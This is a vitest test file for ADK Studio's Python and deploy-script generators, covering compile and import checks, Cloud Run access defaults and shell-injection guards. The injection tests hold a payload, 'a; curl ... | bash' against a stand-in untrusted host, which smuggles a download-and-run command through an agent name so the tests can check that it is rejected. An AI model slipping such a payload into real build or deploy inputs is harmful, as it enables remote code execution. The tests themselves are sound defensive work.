/**
 * Copyright 2025 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

/**
 * @vitest-environment node
 *
 * ADK Studio codegen matrix (remediation task 1.16).
 *
 * ADK Studio hands users Python that they are expected to deploy. If a checkbox
 * combination emits code that will not even import, the user finds out from a
 * Cloud Build log -- or, worse, does not find out at all. This suite generates
 * every meaningful permutation and checks the output with the Python
 * interpreter itself.
 *
 * Two levels, deliberately:
 *
 *   1. `py_compile` (always on) -- catches SyntaxErrors, e.g. an instruction
 *      ending in a quote character that terminates a triple-quoted literal.
 *
 *   2. `import agent` (opt-in via ADK_IMPORT_CHECK=1) -- catches errors that
 *      are invisible to a syntax check, most importantly pydantic
 *      `extra="forbid"` violations such as passing `plugins=[...]` to
 *      `Agent(...)`. Syntactically perfect, fails at import.
 *
 * Level 2 requires a Python environment with google-adk installed. Locally that
 * is the repo `.venv`; in CI it is the dedicated `codegen-import` job.
 */

import { describe, it, expect, beforeAll } from 'vitest';
import * as fs from 'fs';
import * as os from 'os';
import * as path from 'path';
import { execFileSync } from 'child_process';
import { fileURLToPath } from 'url';

import {
  generateAdkPythonCode,
  generateAdk22PythonCode,
  generateAuthPy,
  generateToolsPy,
  generateAppPy,
  generateInitPy,
  generateAdkDeployScript,
  generateMakefile,
  generateCloudBuildYaml,
  generateGcloudCommand,
  TEMPLATES,
} from '../../services/adkTemplates';
import type { A2aConfig, AdkAgentConfig, AgentTool } from '../../services/adkTemplates';

const HERE = path.dirname(fileURLToPath(import.meta.url));
const REPO_ROOT = path.resolve(HERE, '..', '..');
const VENV_PYTHON = path.join(REPO_ROOT, '.venv', 'bin', 'python');
const PYTHON = fs.existsSync(VENV_PYTHON) ? VENV_PYTHON : 'python3';
const RUN_IMPORT_CHECK = process.env.ADK_IMPORT_CHECK === '1';

const BASE: AdkAgentConfig = {
  adkVersion: '1.35.1',
  name: 'matrix_agent',
  description: 'Matrix test agent',
  model: 'gemini-2.5-flash',
  instruction: 'You are a helpful assistant.',
  tools: [],
  useGoogleSearch: false,
  enableOAuth: false,
  authId: 'test-auth-id',
  allowAdcFallback: true,
  enableDiscoveryApi: false,
  discoveryConfig: {
    projectId: 'test-project',
    location: 'global',
    collection: 'default_collection',
    engineId: 'test-engine',
    dataStoreIds: 'test-store',
  },
  enableBqAnalytics: false,
  bqDatasetId: 'test_dataset',
  bqTableId: 'test_table',
  enableThinking: false,
  thinkingBudget: 1024,
  thinkingLevel: 'HIGH',
  enableStreaming: false,
  enableBigQueryMcp: false,
  enableCodeExecution: false,
  enableGraphvizRendering: false,
  enableEmailTool: false,
  enableSecurityCommandCenterApi: false,
  enableRecommenderApi: false,
  enableServiceHealthApi: false,
  enableNetworkManagementApi: false,
  enableCloudAssistApi: false,
  enableCloudLoggingApi: false,
  enableCloudMonitoringApi: false,
  enableCloudRunApi: false,
  enableResourceManagerApi: false,
  enableAdminActivityApi: false,
  enableDatabaseFleetApi: false,
  enableCloudLoggingMcp: false,
  enableBigtableAdminMcp: false,
  enableCloudSqlMcp: false,
  enableCloudMonitoringMcp: false,
  enableComputeEngineMcp: false,
  enableFirestoreMcp: false,
  enableGkeMcp: false,
  enableResourceManagerMcp: false,
  enableSpannerMcp: false,
  enableDeveloperKnowledgeMcp: false,
  enableMapsGroundingMcp: false,
  enableTelemetry: false,
  enableMessageLogging: false,
  enableEvaluation: false,
  enableCiCd: false,
  ciCdRunner: 'none',
  deploymentTarget: 'agent_engine',
  customMcpEndpoints: [],
};

/**
 * Discovered dynamically so that a newly added feature flag is covered by this
 * matrix automatically, without anyone remembering to update a list.
 */
const BOOLEAN_FLAGS = (Object.keys(BASE) as (keyof AdkAgentConfig)[]).filter(
  (k) => typeof BASE[k] === 'boolean'
);

const SAMPLE_TOOLS: AgentTool[] = [
  {
    type: 'VertexAiSearchTool',
    dataStoreId: 'projects/123/locations/global/collections/default_collection/dataStores/hr-store',
    variableName: 'hr_store',
    displayName: 'HR Search',
  },
  { type: 'A2AClientTool', url: 'https://svc.a.run.app', variableName: 'svc_tool' },
];

/**
 * Instruction strings that have historically broken Python string emission.
 * A trailing quote terminates a triple-quoted literal early; an unescaped
 * backslash silently corrupts the generated source without any error.
 */
const ADVERSARIAL_INSTRUCTIONS: Record<string, string> = {
  trailing_double_quote: 'Always answer in "quotes"',
  embedded_triple_quote: 'Use """ to delimit blocks',
  backslash: 'Match the regex \\d+\\s* and read C:\\Users\\data',
  backslash_at_end: 'Ends with a backslash \\',
  newlines: 'Line one.\nLine two.\n\tIndented.',
  apostrophe: "Don't guess; say you don't know",
  non_ascii: 'Répondez en français — always. 日本語も。',
  empty: '',
};

interface MatrixCase {
  name: string;
  config: AdkAgentConfig;
  /** Included in the opt-in Python import check. */
  deep: boolean;
}

function buildCases(): MatrixCase[] {
  const cases: MatrixCase[] = [];

  const allOn: AdkAgentConfig = { ...BASE, tools: SAMPLE_TOOLS };
  for (const flag of BOOLEAN_FLAGS) {
    (allOn as unknown as Record<string, unknown>)[flag as string] = true;
  }

  cases.push({ name: 'baseline_all_off', config: { ...BASE }, deep: true });
  cases.push({ name: 'with_tools', config: { ...BASE, tools: SAMPLE_TOOLS }, deep: true });
  cases.push({ name: 'all_flags_on', config: allOn, deep: true });

  /**
   * Flags that inject a runtime object into the agent/runner wiring rather than
   * just emitting more text. These need the level-2 import check individually:
   * `all_flags_on` nominally covers them, but that case gets skipped whenever a
   * transitive Python dependency is missing, which would silently drop the
   * guard. `enableBqAnalytics` is exactly the flag that produced the
   * `Agent(plugins=[...])` -> pydantic `extra_forbidden` crash.
   */
  const DEEP_FLAGS = new Set<string>([
    'enableBqAnalytics',
    'enableTelemetry',
    'enableMessageLogging',
    'enableCodeExecution',
    'enableStreaming',
    'enableThinking',
  ]);

  // One case per flag, so a failure names the exact checkbox that breaks codegen.
  for (const flag of BOOLEAN_FLAGS) {
    cases.push({
      name: `flag_${String(flag)}`,
      config: { ...BASE, tools: SAMPLE_TOOLS, [flag]: true } as AdkAgentConfig,
      deep: DEEP_FLAGS.has(String(flag)),
    });
  }

  for (const [label, instruction] of Object.entries(ADVERSARIAL_INSTRUCTIONS)) {
    cases.push({
      name: `instruction_${label}`,
      config: { ...BASE, instruction, description: instruction },
      deep: false,
    });
  }

  TEMPLATES.forEach((tpl, i) => {
    cases.push({
      name: `template_${i}_${tpl.id}`,
      config: { ...BASE, ...tpl.config } as AdkAgentConfig,
      deep: true,
    });
  });

  cases.push({ name: 'adk22_baseline', config: { ...BASE, adkVersion: '2.2' }, deep: true });
  cases.push({ name: 'adk22_all_on', config: { ...allOn, adkVersion: '2.2' }, deep: true });

  return cases;
}

const CASES = buildCases();

let outputRoot: string;

function emit(dir: string, config: AdkAgentConfig): string[] {
  fs.mkdirSync(dir, { recursive: true });
  const agentSrc =
    config.adkVersion === '2.2' ? generateAdk22PythonCode(config) : generateAdkPythonCode(config);

  const files: Record<string, string> = {
    'agent.py': agentSrc,
    'auth.py': generateAuthPy(config, config.allowAdcFallback),
    'tools.py': generateToolsPy(config),
    'app.py': generateAppPy(config),
    '__init__.py': generateInitPy(),
    'deploy_re.py': generateAdkDeployScript(config),
  };

  const written: string[] = [];
  for (const [fileName, content] of Object.entries(files)) {
    const p = path.join(dir, fileName);
    fs.writeFileSync(p, content, 'utf8');
    written.push(p);
  }
  return written;
}

function runPython(args: string[], cwd?: string): { ok: boolean; output: string } {
  try {
    execFileSync(PYTHON, args, {
      cwd,
      stdio: 'pipe',
      env: { ...process.env, PYTHONDONTWRITEBYTECODE: '1' },
    });
    return { ok: true, output: '' };
  } catch (e: unknown) {
    const err = e as { stderr?: Buffer; stdout?: Buffer };
    return {
      ok: false,
      output: (err.stderr?.toString() || err.stdout?.toString() || String(e)).trim(),
    };
  }
}

describe('ADK Studio codegen matrix', () => {
  beforeAll(() => {
    outputRoot = fs.mkdtempSync(path.join(os.tmpdir(), 'adk-codegen-matrix-'));
    const probe = runPython(['--version']);
    if (!probe.ok) {
      throw new Error(
        `Python is required for the codegen matrix but "${PYTHON} --version" failed:\n${probe.output}`
      );
    }
  });

  it('covers every boolean feature flag', () => {
    // Guards against the matrix silently going stale when a flag is added.
    expect(BOOLEAN_FLAGS.length).toBeGreaterThan(30);
    for (const flag of BOOLEAN_FLAGS) {
      expect(CASES.some((c) => c.name === `flag_${String(flag)}`)).toBe(true);
    }
  });

  /**
   * The worst defect found in the audit was a deploy script that ran a local
   * chat turn and exited 0 without ever calling `agent_engines.create`. Cloud
   * Build went green, the UI reported success, and nothing was deployed.
   *
   * "It compiles" would never have caught that, so assert the semantics.
   */
  describe('deploy script actually deploys', () => {
    it('emits agent_engines.create for the supported ADK version', () => {
      const script = generateAdkDeployScript({
        ...BASE,
        adkVersion: '1.35.1',
        deploymentTarget: 'agent_engine',
      });
      expect(script).toContain('agent_engines.create');
    });

    it('documents that ADK 2.2 still does NOT deploy', () => {
      // This asserts known-broken behaviour on purpose. ADK 2.2 is currently
      // unreachable from the UI (remediation task 1.9) precisely because its
      // deploy script never creates an agent engine. If someone fixes the
      // generator, this test fails -- which is the signal to re-enable the UI
      // option. If someone re-enables the option WITHOUT fixing the generator,
      // the test above is the one that should have stopped them.
      const script = generateAdkDeployScript({
        ...BASE,
        adkVersion: '2.2',
        deploymentTarget: 'agent_engine',
      });
      expect(script).not.toContain('agent_engines.create');
    });

    it('passes env_vars as a dict to prevent Vertex AI SDK duplicate EnvVar bug', () => {
      const script = generateAdkDeployScript({
        ...BASE,
        adkVersion: '1.35.1',
        deploymentTarget: 'agent_engine',
      });
      expect(script).toContain('env_vars = {}');
      expect(script).toContain('env_vars[key] = value');
      expect(script).not.toContain('env_vars.append(key)');
    });
  });

  describe('thinking config generation', () => {
    it('emits thinking_level for Gemini 3 models', () => {
      const code = generateAdkPythonCode({
        ...BASE,
        model: 'gemini-3.8-flash',
        enableThinking: true,
        thinkingLevel: 'HIGH',
      });
      expect(code).toContain('thinking_level = os.getenv("THINKING_LEVEL", "HIGH")');
      expect(code).toContain('thinking_config = genai_types.ThinkingConfig(');
      expect(code).toContain('thinking_level=thinking_level');
    });

    it('emits thinking_budget for Gemini 2.5 models', () => {
      const code = generateAdkPythonCode({
        ...BASE,
        model: 'gemini-2.5-flash',
        enableThinking: true,
        thinkingBudget: 1024,
      });
      expect(code).toContain('thinking_budget = int(os.getenv("THINKING_BUDGET", "1024"))');
      expect(code).toContain('thinking_config = genai_types.ThinkingConfig(');
      expect(code).toContain('thinking_budget=thinking_budget');
    });

    it('emits thinking_level in ADK 2.2 for Gemini 3 models', () => {
      const code = generateAdk22PythonCode({
        ...BASE,
        adkVersion: '2.2',
        model: 'gemini-3.5-flash',
        enableThinking: true,
        thinkingLevel: 'MEDIUM',
      });
      expect(code).toContain('thinking_level = os.getenv("THINKING_LEVEL", "MEDIUM")');
      expect(code).toContain('thinking_level=thinking_level');
    });
  });

  it.each(CASES.map((c) => [c.name, c] as const))(
    'emits syntactically valid Python: %s',
    (_name, testCase) => {
      const dir = path.join(outputRoot, testCase.name);
      const files = emit(dir, testCase.config);
      const result = runPython(['-m', 'py_compile', ...files]);
      expect(
        result.ok,
        `Generated Python failed to compile for "${testCase.name}".\n` +
          `Sources: ${dir}\n\n${result.output}`
      ).toBe(true);
    }
  );

  describe.runIf(RUN_IMPORT_CHECK)('imports against a real ADK install', () => {
    it.each(CASES.filter((c) => c.deep).map((c) => [c.name, c] as const))(
      'imports cleanly: %s',
      (_name, testCase) => {
        const dir = path.join(outputRoot, `import_${testCase.name}`);
        emit(dir, testCase.config);
        const result = runPython(['-c', 'import agent'], dir);

        // A missing third-party package is an environment gap, not a codegen
        // defect -- but a ValidationError or TypeError absolutely is.
        const isMissingDependency =
          /ModuleNotFoundError/.test(result.output) &&
          !/No module named ['"]agent['"]/.test(result.output);

        if (!result.ok && isMissingDependency) {
          console.warn(
            `[codegen-matrix] skipping import check for "${testCase.name}": ` +
              result.output.split('\n').pop()
          );
          return;
        }

        expect(
          result.ok,
          `Generated agent.py failed to import for "${testCase.name}".\n` +
            `Sources: ${dir}\n\n${result.output}`
        ).toBe(true);
      }
    );
  });
});

/**
 * Shell-injection guards on the deploy templates (F-01).
 *
 * The matrix above never calls these two generators -- it emits Python only --
 * so the validation added to `generateMakefile` and `generateCloudBuildYaml`
 * would otherwise be untested. These are pure string assertions with no Python
 * dependency, so they run at level 1 and are never skipped.
 *
 * `generateCloudBuildYaml`'s own `bash -c` steps interpolate nothing; the sink
 * is transitive, because its second step runs `make deploy` and the Makefile
 * splices the agent name into `gcloud run deploy`.
 */
describe('deploy template shell-injection guards', () => {
  const cloudRun: AdkAgentConfig = { ...BASE, deploymentTarget: 'cloud_run' };
  const INJECTION = 'a; curl https://untrusted.example.com/s.sh | bash';

  it('emits the expected deploy line for a valid name', () => {
    // Underscores are still translated to hyphens, as they always were.
    // The access flag is `--no-allow-unauthenticated` now: this line used to
    // hardcode `--allow-unauthenticated` (remediation 2.7).
    expect(generateMakefile(cloudRun)).toContain(
      'gcloud run deploy matrix-agent --source . --region us-central1 --no-allow-unauthenticated'
    );

    const yaml = generateCloudBuildYaml(cloudRun, 'test-project');
    expect(yaml).toContain('make deploy');
    expect(yaml).toContain("entrypoint: 'bash'");
  });

  it('refuses to generate a Makefile for an injection payload', () => {
    expect(() => generateMakefile({ ...cloudRun, name: INJECTION })).toThrow(
      /not a valid Google Cloud resource name/
    );
  });

  it('refuses to generate cloudbuild.yaml for an injection payload', () => {
    expect(() =>
      generateCloudBuildYaml({ ...cloudRun, name: INJECTION }, 'test-project')
    ).toThrow(/not a valid Google Cloud resource name/);
  });

  it('rejects the payload for the agent_engine target too', () => {
    // The cloud-run deploy line is emitted regardless of deploymentTarget, so
    // the guard must not be conditional on it.
    expect(() =>
      generateMakefile({ ...cloudRun, deploymentTarget: 'agent_engine', name: INJECTION })
    ).toThrow(/not a valid Google Cloud resource name/);
  });

  /**
   * Deliberate behaviour, pinned so nobody "tightens" it later: an empty name
   * means the builder form is not filled in yet. Both generators run on the
   * Agent Builder render path on every keystroke, starting from `name: ''`, so
   * throwing here would blank the page before the user has typed anything.
   * An empty name is also harmless -- there is nothing to inject.
   */
  it('does not throw for an empty name (partially-filled config)', () => {
    expect(() => generateMakefile({ ...cloudRun, name: '' })).not.toThrow();
    expect(() => generateCloudBuildYaml({ ...cloudRun, name: '' }, 'test-project')).not.toThrow();
    expect(generateMakefile({ ...cloudRun, name: '' })).toContain('gcloud run deploy');
  });
});

/**
 * Cloud Run access modes (remediation 2.7).
 *
 * `--allow-unauthenticated` used to be hardcoded in the Makefile, so every
 * agent built here was callable by anyone on the internet and the user was
 * never asked. These tests pin the exact emitted line for each mode, and pin
 * the default, because the default is the whole point of the fix.
 */
describe('Cloud Run access modes', () => {
  const cloudRun: AdkAgentConfig = { ...BASE, deploymentTarget: 'cloud_run' };
  const DEPLOY_PREFIX =
    'gcloud run deploy matrix-agent --source . --region us-central1 ';

  it('defaults to authenticated when the mode is not set at all', () => {
    const makefile = generateMakefile(cloudRun);
    expect(makefile).toContain(`${DEPLOY_PREFIX}--no-allow-unauthenticated`);
    expect(makefile).not.toContain(`${DEPLOY_PREFIX}--allow-unauthenticated`);
  });

  it('emits --no-allow-unauthenticated for "authenticated"', () => {
    expect(
      generateMakefile({ ...cloudRun, cloudRunAccess: 'authenticated' })
    ).toContain(`${DEPLOY_PREFIX}--no-allow-unauthenticated`);
  });

  it('emits --allow-unauthenticated only when "public" is chosen', () => {
    const makefile = generateMakefile({ ...cloudRun, cloudRunAccess: 'public' });
    expect(makefile).toContain(`${DEPLOY_PREFIX}--allow-unauthenticated`);
    // Scoped to the deploy line: the guidance comment legitimately mentions
    // --no-allow-unauthenticated as the way to lock the service down again.
    expect(makefile).not.toContain(`${DEPLOY_PREFIX}--no-allow-unauthenticated`);
    // The user must be told what they just chose.
    expect(makefile).toContain('ANYONE on the internet');
  });

  it('pairs --iap with --no-allow-unauthenticated', () => {
    const makefile = generateMakefile({ ...cloudRun, cloudRunAccess: 'iap' });
    expect(makefile).toContain(
      `${DEPLOY_PREFIX}--no-allow-unauthenticated --iap`
    );
  });

  it('documents the IAP service agent grant and the Console caveat', () => {
    const makefile = generateMakefile({ ...cloudRun, cloudRunAccess: 'iap' });
    expect(makefile).toContain(
      'service-PROJECT_NUMBER@gcp-sa-iap.iam.gserviceaccount.com'
    );
    expect(makefile).toContain('roles/run.invoker');
    expect(makefile).toContain('OAuth clients');
    expect(makefile).toContain('Cloud Console');
  });

  it('falls back to the secure mode for an unrecognised value', () => {
    // Defensive: a persisted or hand-edited config must never fail open.
    const rogue = {
      ...cloudRun,
      cloudRunAccess: 'anything-goes',
    } as unknown as AdkAgentConfig;
    expect(generateMakefile(rogue)).toContain(
      `${DEPLOY_PREFIX}--no-allow-unauthenticated`
    );
  });

  it('still validates the agent name in every mode', () => {
    const INJECTION = 'a; curl https://untrusted.example.com/s.sh | bash';
    for (const mode of ['authenticated', 'public', 'iap'] as const) {
      expect(() =>
        generateMakefile({ ...cloudRun, cloudRunAccess: mode, name: INJECTION })
      ).toThrow(/not a valid Google Cloud resource name/);
    }
  });

  it('never throws on the render path, whatever the mode', () => {
    // generateMakefile runs on every keystroke in the Agent Builder.
    for (const mode of ['authenticated', 'public', 'iap'] as const) {
      expect(() =>
        generateMakefile({ ...cloudRun, cloudRunAccess: mode, name: '' })
      ).not.toThrow();
    }
  });

  it('keeps every shipped starter template on the secure default', () => {
    // The starter templates never opt into public access; if one ever does it
    // must be a deliberate, reviewed change rather than an accident.
    for (const template of TEMPLATES) {
      expect(template.config.cloudRunAccess ?? 'authenticated').not.toBe(
        'public'
      );
      const makefile = generateMakefile({
        ...cloudRun,
        ...template.config,
      } as AdkAgentConfig);
      expect(makefile).toContain('--no-allow-unauthenticated');
    }
  });
});

/**
 * The A2A deploy script shares the access mode with the ADK Makefile.
 * Its old default was `allowUnauthenticated: true` -- public.
 */
describe('A2A gcloud script access modes', () => {
  const a2a: A2aConfig = {
    serviceName: 'matrix-a2a',
    displayName: 'Matrix A2A',
    providerOrganization: 'Test Org',
    model: 'gemini-2.5-flash',
    region: 'us-central1',
    memory: '1Gi',
    instruction: 'You are a helpful assistant.',
    enableCors: true,
    useGoogleSearch: false,
    tools: [],
  };

  it('defaults to --no-allow-unauthenticated when no mode is given', () => {
    const script = generateGcloudCommand(a2a, 'test-project');
    expect(script).toContain('  --no-allow-unauthenticated \\');
    expect(script).not.toContain('  --allow-unauthenticated \\');
  });

  it('emits --allow-unauthenticated only for "public"', () => {
    const script = generateGcloudCommand(
      { ...a2a, cloudRunAccess: 'public' },
      'test-project'
    );
    expect(script).toContain('  --allow-unauthenticated \\');
  });

  it('emits both flags plus follow-up steps for "iap"', () => {
    const script = generateGcloudCommand(
      { ...a2a, cloudRunAccess: 'iap' },
      'test-project'
    );
    expect(script).toContain('  --no-allow-unauthenticated --iap \\');
    expect(script).toContain(
      'service-PROJECT_NUMBER@gcp-sa-iap.iam.gserviceaccount.com'
    );
    expect(script).toContain('roles/iap.httpsResourceAccessor');
  });
});
